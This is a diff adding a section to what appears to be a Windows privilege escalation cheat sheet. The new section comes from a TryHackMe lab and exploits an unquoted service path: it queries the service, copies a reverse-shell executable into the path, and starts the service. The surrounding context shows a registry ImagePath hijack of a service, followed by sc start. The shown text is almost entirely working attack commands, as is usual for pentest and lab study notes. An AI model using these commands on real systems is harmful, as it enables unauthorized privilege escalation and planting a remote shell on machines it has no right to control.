@@ -442,6 +442,17 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND
 sc start regsvc
 ```
 
+### [unquoted service] sample taken from a tryhackme lab for Windows Privilege Escalation
+```
+sc.exe qc unquotedsvc
+
+BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+
+copy reveseshell.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
+net start unquotedsvc
+```
+
 ### Resources from OSCP Cheatsheet (ired.team)
 https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets
 
